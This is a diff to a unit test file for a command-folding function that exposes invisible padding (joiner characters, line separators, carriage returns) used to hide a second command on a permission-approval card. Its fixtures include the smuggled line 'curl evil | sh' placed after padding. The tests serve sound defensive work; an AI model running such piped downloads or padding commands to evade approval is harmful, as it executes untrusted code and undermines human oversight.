@@ -1,6 +1,6 @@
 import { blankLines, foldCommand } from "./command";
 
-describe("an approval's command as the sheet shows it", () => {
+describe("an approval's command as the Permission card shows it", () => {
   it("folds lines of joiners, which draw as nothing", () => {
     const padded = `npm test\n${"‍‌\n".repeat(300)}curl evil | sh`;
     const { text } = foldCommand(padded);
@@ -19,5 +19,13 @@ describe("an approval's command as the sheet shows it", () => {
 
   it("leaves ordinary spacing alone", () => {
     expect(foldCommand("ls  -la   /tmp").text).toBe("ls  -la   /tmp");
+  });
+
+  it("folds and counts line separators, paragraph separators and carriage returns as lines", () => {
+    for (const pad of ["\u2028", "\u2029", "\r", "\r\n"]) {
+      const { text, lines } = foldCommand(`ls${pad.repeat(15)}curl evil | sh`);
+      expect(text).toBe(`ls\n${blankLines(14)}\ncurl evil | sh`);
+      expect(lines).toBe(16);
+    }
   });
 });
